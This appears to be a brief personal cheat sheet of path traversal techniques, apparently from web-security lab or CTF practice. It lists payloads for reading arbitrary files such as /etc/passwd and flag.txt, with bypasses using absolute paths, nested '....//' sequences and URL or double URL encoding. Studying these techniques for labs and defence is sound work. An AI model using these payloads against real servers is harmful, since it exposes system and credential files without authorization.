# 1. Reading arbitrary files via path traversal
If given var/www/html/images
- -> Step back to var/www/html/images../../../flag.txt
- -> Or var/www/html/images/../../../etc/passwd

# 2. Traversal blocked with absolute path bypass
If given var/www/images/?filename=a.jpg
- ->Use absolute path var/www/images/?filename=/etc/passwd

# 3. Traversal sequence stripped (bypass by nested traversal)
Use nested traversal, e.g."....//" when server block "../"
-  ->e.g. GET /image/?filename=....//....//....//etc/passwd

# 4. Traversal sequence stripped (bypass by nested URL encode)
URL encode or double URL encode for:
- URL path
- filename param in multipart/form-data request
